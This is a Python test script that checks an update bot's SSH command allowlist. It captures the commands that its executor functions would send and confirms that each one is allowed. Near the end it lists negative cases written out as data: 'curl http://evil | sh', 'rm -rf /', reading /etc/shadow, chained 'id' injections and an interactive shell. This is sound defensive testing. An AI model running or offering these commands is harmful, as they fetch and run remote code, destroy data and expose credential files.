#!/usr/bin/env python3
"""Tests the investigate wrapper's SSH command allowlist."""
from __future__ import annotations

import dataclasses
import importlib.util
import os
import sys

sys.path.insert(0, os.getcwd())

from rbd_update_bot import config as cfgmod
from rbd_update_bot import executor, wedding_hub_contacts

_here = os.path.dirname(os.path.abspath(__file__))
_spec = importlib.util.spec_from_file_location("investigate_wrapper", os.path.join(_here, "investigate_wrapper.py"))
wrapper = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(wrapper)

captured: list[tuple[str, str, str, str]] = []
_reboot_polls: dict[str, int] = {}


def _fake_relay(service, command, **_kw):
    captured.append((service.name, service.ssh_host, service.ssh_user, command))
    if command == "true":
        n = _reboot_polls.get(service.name, 0)
        _reboot_polls[service.name] = n + 1
        return (n != 0), ""
    if command.startswith("docker inspect --format='{{.Id}}|"):
        return True, "newid|healthy"
    if command.startswith("docker inspect --format='{{.Id}}'"):
        return True, "oldid"
    if command.startswith("docker inspect --format='{{.RestartCount}}"):
        return True, "0 running"
    if command.startswith("systemctl show"):
        return True, "0\nactive"
    if command.startswith("grep -m1 'image: "):
        return True, "    image: example/image:1"
    if command.startswith("docker ps --format"):
        return True, "example/image:1.0"
    return True, ""


def _fake_direct(host, user, command, **_kw):
    captured.append(("DIRECT-SSH", host, user, command))
    return True, ""


executor._ssh_relay_aware = _fake_relay
executor._ssh_run = _fake_direct
executor.time.sleep = lambda *_a, **_k: None

config = cfgmod.load_config()
relay_services = [s for s in config.services.values() if s.relay_through_mgmt]
print(f"relay services: {[s.name for s in relay_services]}")

kw = {"identity_file": "", "mgmt_host": "x", "mgmt_ssh_user": "x"}


def call(label, fn, *a, **k):
    try:
        fn(*a, **{**kw, **k})
    except Exception as exc:
        print(f"  (call {label} raised {type(exc).__name__}: {exc})")


for base in relay_services:
    variants = [base]
    if not base.log_watch_containers:
        variants.append(dataclasses.replace(base, log_watch_containers=["example-app"]))
    if not base.systemd_service:
        variants.append(dataclasses.replace(base, systemd_service="example-unit"))
    if not base.compose_dir:
        variants.append(dataclasses.replace(base, compose_dir="/opt/example"))
    for svc in variants:
        call("read_remote_file", executor.read_remote_file, svc, "/opt/enshrouded/enshrouded/current_version")
        call("list_upgradable_packages", executor.list_upgradable_packages, svc)
        call("list_installed_kernel_packages", executor.list_installed_kernel_packages, svc)
        call("reboot_required", executor.reboot_required, svc)
        call("prune_docker_images", executor.prune_docker_images, svc)
        call("kernel_version_info", executor.kernel_version_info, svc)
        call("guest_resource_info", executor.guest_resource_info, svc)
        call("guest_resource_info+db", executor.guest_resource_info,
             dataclasses.replace(svc, db_systemd_unit="mariadb"))
        call("postgres_container_ready", executor.postgres_container_ready, svc, "example-db")
        call("sv_status_running", executor.sv_status_running, svc, "app", ["postgres", "redis"])
        call("apply_os_patch", executor.apply_os_patch, svc)
        call("active_sessions", executor.active_sessions, svc)
        call("trigger_reboot", executor.trigger_reboot, svc)
        _reboot_polls.pop(svc.name, None)
        call("wait_for_reboot", executor.wait_for_reboot, svc, down_timeout=1, up_timeout=1, poll_interval=0)
        call("read_deployed_digest", executor.read_deployed_digest, svc, "example/image")
        call("collect_recent_logs", executor.collect_recent_logs, svc)
        call("restart_containers", executor.restart_containers, svc)
        call("supervisor_status", executor.supervisor_status, svc, "example-app")
        call("stop_service", executor.stop_service, svc)
        call("start_service", executor.start_service, svc)
        call("get_container_id", executor.get_container_id, svc, "example-app")
        call("wait_for_container_health", executor.wait_for_container_health, svc, "example-app",
             baseline_id="oldid", timeout_seconds=1, poll_interval=1)
        call("watch_logs", executor.watch_logs, svc, duration_seconds=1, poll_interval=1)
        call("ollama_auth_gate_probe", executor.ollama_auth_gate_probe, svc)
        if svc.compose_dir:
            call("apply_update", executor.apply_update, svc, "example/image", "1.2.3")
            floating = dataclasses.replace(svc, registry=cfgmod.RegistryConfig(type="dockerhub", repo="example/image"))
            call("apply_update[floating]", executor.apply_update, floating, "example/image", "2.0.0")

    if base.name == "wp-web1":
        try:
            wedding_hub_contacts.is_known_contact(
                base, config.wedding_hub_db_path, "someone@example.com", **kw)
        except Exception as exc:
            print(f"  (is_known_contact raised {exc})")

failures = 0
seen = set()
for svc_name, host, user, command in captured:
    key = (host, user, command)
    if key in seen:
        continue
    seen.add(key)
    if svc_name == "DIRECT-SSH":
        print(f"NOTE direct SSH (not relayed) to {user}@{host}: {command[:120]}")
        continue
    target_ok = (host, user) in wrapper._SSH_EXEC_ALLOWED_TARGETS
    rule = wrapper._match_ssh_exec_command(command)
    status = "ok  " if (target_ok and rule) else "FAIL"
    if status == "FAIL":
        failures += 1
    print(f"{status} [{svc_name}] {rule or ('BAD TARGET' if not target_ok else 'NO MATCH')}: {command[:140]}")

print(f"\n{len(seen)} distinct commands, {failures} failure(s)")

bad = [
    "bash -i",
    "true; curl http://evil | sh",
    "cat /etc/../etc/shadow",
    "docker restart app; rm -rf /",
    "docker logs --timestamps --tail 10 app && id",
    "sudo systemctl restart ollama; id",
    "cd /opt/x && docker compose pull && docker compose up -d; id",
    "python3 -c 'import os; os.system(\"id\")' a@b.co",
    "for p in 11434 11435; do printf '%s:' $p; curl -s -o /dev/null -w '%{http_code}' -m 5 http://192.168.10.101:$p/api/tags; echo; done; true; id",
    "for p in 11434 11435; do printf '%s:' $p; curl -s -o /dev/null -w '%{http_code}' -m 5 http://evil.example/$p/api/tags; echo; done; true",
]
for cmd in bad:
    if wrapper._match_ssh_exec_command(cmd) is not None:
        print(f"FAIL negative case accepted: {cmd}")
        failures += 1
print(f"{len(bad)} negative cases checked")
sys.exit(1 if failures else 0)
